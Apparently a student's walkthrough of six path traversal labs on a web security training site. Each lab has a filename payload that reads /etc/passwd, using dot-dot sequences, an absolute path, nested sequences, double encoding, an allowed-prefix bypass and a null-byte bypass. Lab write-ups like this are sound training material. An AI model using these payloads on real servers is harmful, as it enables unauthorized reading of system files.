# File path traversal, simple case
1. Load site
2. Inspecting web root HTML source reveals the following URLS in the page
```html
<img src="/image?filename=45.jpg">
```
3. Request the following URL to retrieve `/etc/passwd`
```
https://0ae4000d03b8d8f1805e94d100e10061.web-security-academy.net/image?filename=../../../../etc/passwd
```
# File path traversal, traversal sequences blocked with absolute path bypass
1. Load site
2. Inspecting web root HTML source reveals the following URLs in the page
```html
<img src="/image?filename=45.jpg">
```
3. Make GET request using absolute path to `/etc/passwd`
```
/image?filename=/etc/passwd
```
# File path traversal, traversal sequences stripped non-recursively
1. Load site
2. Inspecting web root HTML source reveals the following URLs in the page
```html
<img src="/image?filename=45.jpg">
```
3. Make GET request to bypass non-recursive filtering
```
/image?filename=....//....//....//etc/passwd
```
# File path traversal, traversal sequences stripped with superfluous URL decode
1. Load site
2. Inspecting web root HTML source reveals the following URLs in the page
```html
<img src="/image?filename=45.jpg">
```
3. Make GET request double URL encoding the payload (I used Hackvertor extension on the payload)
```
/image?filename=<@urlencode><@urlencode>../../../</@urlencode></@urlencode>etc/passwd
```
# File path traversal, validation of start of path
1. Load site
2. Inspecting web root HTML source reveals the following URLs in the page
```html
<img src="/image?filename=45.jpg">
```
3. Make GET request providing the approved path first, then traversing to desired location
```
/image?filename=/var/www/images/../../../../../../../etc/passwd
```
# File path traversal, validation of file extension with null byte bypass
1. Load site
2. Inspecting web root HTML source reveals the following URLs in the page
```html
<img src="/image?filename=45.jpg">
```
3. Make GET request providing the approved file extension but terminating the payload just before the valid extension with a null byte
```
/image?filename=../../../etc/passwd%00.jpg
```
